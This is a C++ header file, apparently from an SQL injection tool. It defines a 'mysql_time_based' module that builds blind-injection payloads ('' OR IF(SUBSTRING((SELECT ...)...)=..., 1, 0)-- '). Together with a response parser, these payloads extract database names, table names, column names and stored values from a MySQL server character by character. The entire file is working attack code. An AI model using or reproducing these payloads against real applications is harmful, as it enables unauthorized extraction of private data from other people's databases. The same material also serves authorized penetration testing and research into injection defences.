#ifndef MYSQL_TIME_BASED
#define MYSQL_TIME_BASED

#define TIME_BASED_RECORD 0
#define TIME_BASED_INDEX 1
#define TIME_BASED_CMP_START 2
#define TIME_BASED_CMP 3
#define TIME_BASED_BUFFER 4
#define TIME_BASED_MARKED 5
#define TIME_BASED_DATABASE 6
#define TIME_BASED_TABLE 7
#define TIME_BASED_COLUMN 8

#include "../../Vaccine.hpp"

struct mysql_time_based
{
        static std::string payload(sptr_vector& config, const uint8& type)
        {
                switch (type)
                {
                case DATABASES:
                        return "' OR IF(SUBSTRING(("
                               "SELECT schema_name "
                               "FROM information_schema.schemata "
                               "LIMIT 1 OFFSET " +
                               *config[TIME_BASED_INDEX] + "), " +
                               *config[TIME_BASED_CMP_START] + ", 1)='" +
                               *config[TIME_BASED_CMP] + "', 1, 0)-- ";
                case TABLES:
                        return "' OR IF(SUBSTRING(("
                               "SELECT table_name "
                               "FROM information_schema.tables "
                               "WHERE table_schema='" +
                               *config[TIME_BASED_DATABASE] + "' " +
                               "LIMIT 1 OFFSET " +
                               *config[TIME_BASED_INDEX] + "), " +
                               *config[TIME_BASED_CMP_START] + ", 1)='" +
                               *config[TIME_BASED_CMP] + "', 1, 0)-- ";
                case COLUMNS:
                        return "' OR IF(SUBSTRING(("
                               "SELECT column_name "
                               "FROM information_schema.columns "
                               "WHERE table_schema='" +
                               *config[TIME_BASED_DATABASE] + "' " +
                               "AND table_name='" +
                               *config[TIME_BASED_TABLE] + "' " +
                               "LIMIT 1 OFFSET " +
                               *config[TIME_BASED_INDEX] + "), " +
                               *config[TIME_BASED_CMP_START] + ", 1)='" +
                               *config[TIME_BASED_CMP] + "', 1, 0)-- ";
                case VALUES:
                        return "' OR IF(SUBSTRING((SELECT " +
                               *config[TIME_BASED_COLUMN] + " " +
                               "FROM " + *config[TIME_BASED_DATABASE] + "." +
                               *config[TIME_BASED_TABLE] + " " +
                               "LIMIT 1 OFFSET " +
                               *config[TIME_BASED_INDEX] + "), " +
                               *config[TIME_BASED_CMP_START] + ", 1)='" +
                               *config[TIME_BASED_CMP] + "', 1, 0)-- ";
                default:
                        return std::string();
                }
        };

        static str_vector parser(const std::string& response, sptr_vector& config)
        {
                str_vector values;
                if (response != *config[TIME_BASED_RECORD])
                {
                        values.push_back(*config[TIME_BASED_CMP]);
                        *config[TIME_BASED_CMP] = "!";
                        const int index = std::stoi(*config[TIME_BASED_CMP_START]);
                        *config[TIME_BASED_CMP_START] = std::to_string(index + 1);
                }
                else
                {
                        (*config[TIME_BASED_CMP])[0] += 1;
                        switch ((*config[TIME_BASED_CMP])[0])
                        {
                        case 96:
                        case '\'':
                        case '\"':
                        case '\\':
                                (*config[TIME_BASED_CMP])[0] += 1;
                                break;
                        default:
                                break;
                        }
                }
                return values;
        };
};
#endif
